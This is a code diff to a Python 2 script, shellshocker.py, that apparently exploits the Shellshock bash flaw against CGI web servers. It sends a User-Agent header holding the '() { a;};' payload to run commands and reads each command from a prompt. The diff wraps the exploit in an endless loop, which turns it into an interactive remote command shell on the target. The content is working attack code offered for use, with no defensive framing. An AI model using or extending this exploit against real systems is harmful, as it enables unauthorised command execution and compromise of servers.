@@ -9,7 +9,7 @@ def shellshocker(url):
 
 	useragent = '() { a;};echo \"Content-type: text/plain\"; echo; echo;'
 
-	getcommand = raw_input("Shellshock Command: ")
+	getcommand = raw_input("shellshock/command$ ")
 
 	command1 = getcommand.split(' ',1)[0]
 
@@ -34,8 +34,12 @@ def shellshocker(url):
 
 def main():
 	try:
-		shellshocker(sys.argv[1])
+		while 1:
+			shellshocker(sys.argv[1])
 	except:
-		print "Using ERROR:\nHow to use example: 'python shellshocker.py http://example.com/cgi-bin/cat'\n"
+		if len(sys.argv[1]) < 1:
+			print "Using ERROR:\nHow to use example: 'python shellshocker.py http://example.com/cgi-bin/cat'\n"
+		else:
+			print "\nAborted / Invulnerable\n"
 
 main()
